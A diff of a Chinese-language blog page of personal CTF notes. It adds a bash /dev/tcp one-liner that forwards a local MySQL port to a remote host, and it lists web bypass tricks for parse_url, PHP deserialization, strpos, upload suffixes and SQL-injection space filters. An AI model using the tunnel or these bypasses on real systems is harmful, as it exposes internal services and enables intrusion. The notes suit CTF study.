@@ -83,19 +83,19 @@
 
 
 
-<meta name="description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 parse_url url中&#x2F;全换成&#x2F;&#x2F;&#x2F; 反序列化遇到protected变量，可以直接把private改成public然后把生成的加上%00*%00 strpos 大小写敏感，数组绕过也可。 php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)curl -x 123.45.">
+<meta name="description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
 <meta name="keywords" content="ctf,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="个人打CTF的一些总结">
 <meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2019&#x2F;11&#x2F;11&#x2F;zongjie.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
-<meta property="og:description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 parse_url url中&#x2F;全换成&#x2F;&#x2F;&#x2F; 反序列化遇到protected变量，可以直接把private改成public然后把生成的加上%00*%00 strpos 大小写敏感，数组绕过也可。 php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)curl -x 123.45.">
+<meta property="og:description" content="个人打CTF的一些总结本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂 无其他文件进行端口转发  exec 4&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;3306;exec 5&amp;lt;&amp;gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999;cat &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;5 &amp;amp;cat &amp;lt;&amp;amp;5 &amp;gt;&amp;amp;4; parse_url url中&#x2F;全换">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20190224160008531-1260082376.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170904171827038-754070839.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20190826205559423-235402880.png">
-<meta property="og:updated_time" content="2019-12-04T11:42:14.960Z">
+<meta property="og:updated_time" content="2020-08-26T04:20:30.696Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;1063309-20170731154248068-1767961687.png">
 
@@ -376,6 +376,8 @@
 
       
         <h1 id="个人打CTF的一些总结"><a href="#个人打CTF的一些总结" class="headerlink" title="个人打CTF的一些总结"></a>个人打CTF的一些总结</h1><p><u><strong>本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂</strong></u></p>
+<p>无其他文件进行端口转发</p>
+<p> <code>exec 4&lt;&gt;/dev/tcp/127.0.0.1/3306;exec 5&lt;&gt;/dev/tcp/ip/9999;cat &lt;&amp;4 &gt;&amp;5 &amp;cat &lt;&amp;5 &gt;&amp;4;</code></p>
 <p>parse_url url中/全换成///</p>
 <p>反序列化遇到protected变量，可以直接把private改成public然后把生成的加上%00*%00</p>
 <p>strpos 大小写敏感，数组绕过也可。</p>
@@ -422,7 +424,7 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^php:\/\/.*resource=([^|]*)/i</span><br></pre></td></tr></table></figure>
 
-<p>26.sql注入空格还可以用%,/**/等来代替</p>
+<p>26.sql注入空格还可以用\t,/**/等来代替</p>
 
       
     </div>
